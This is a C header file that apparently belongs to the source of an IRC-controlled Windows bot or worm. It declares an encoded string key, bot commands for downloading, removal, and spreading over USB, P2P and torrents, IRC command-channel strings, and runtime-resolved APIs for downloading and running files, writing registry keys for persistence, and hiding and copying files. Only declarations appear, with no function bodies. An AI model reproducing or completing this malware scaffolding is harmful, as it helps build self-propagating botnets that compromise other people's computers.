    /* ENCRYPTION KEY */
    extern char decode_ps[];

    /* CMDS */
    extern char cmd__rcl[],cmd__DISCONNECT[],cmd__REMOVAL[],cmd__jn[],cmd__pt[],cmd__USBPLUS[],cmd__WGET[], cmd__P2P[], cmd__TORRENT[];

    /* IRC */
    extern char my_nk[],my_usr[],my_s4y[],my_ntc[],my_ps[];
    extern char my_jn[],my_pt[],my_qt[],my_P1N6[],my_P0N6[];
    extern char my_4_4_3[],my_3_3_2[];

    /* WS2_32 */
    extern char WS2_32_[],WSACleanup_[],WSAStartup_[];
    extern char closesocket_[],connect_[],gethostbyname_[],htons_[];
    extern char recv_[],send_[],socket_[],inet_addr_[],select_[];

    /*UrlMon Imports */
    extern char urlmon_[],URLDownloadToFile_[];

    /* SHELL32 */
    extern char shell32_[],ShellExecute_[];

    /*ADVAPI*/
    extern char advapi32_[],RegCreateKeyEx_[],RegSetValueEx_[],RegCloseKey_[];

    /* kernel32.dll Imports*/
    extern char kernel32_[],WaitForSingleObject_[],CreateMutex_[];
    extern char ExitThread_[],CreateThread_[],GetLocaleInfo_[],GetModuleFileName_[],GetModuleHandle_[],GetDriveType_[];
    extern char SetFileAttributes_[],DeleteFile_[],CopyFile_[],GetVersionEx_[],GetLongPathName_[];
    extern char CreateFile_[],WriteFile_[],CreateProcess_[],CloseHandle_[],CreateDirectory_[];

    extern  HMODULE WS2_32,urlmon,kernel32;

    extern FARPROC my_WSACleanup, my_WSAStartup, my_closesocket, my_connect, my_gethostbyname, my_htons, my_recv, my_send, my_socket, my_inet_addr, my_select, my_URLDownloadToFile;
    extern FARPROC my_ShellExecute, my_RegCreateKeyEx, my_RegSetValueEx, my_RegCloseKey;

    void load_apis(void);

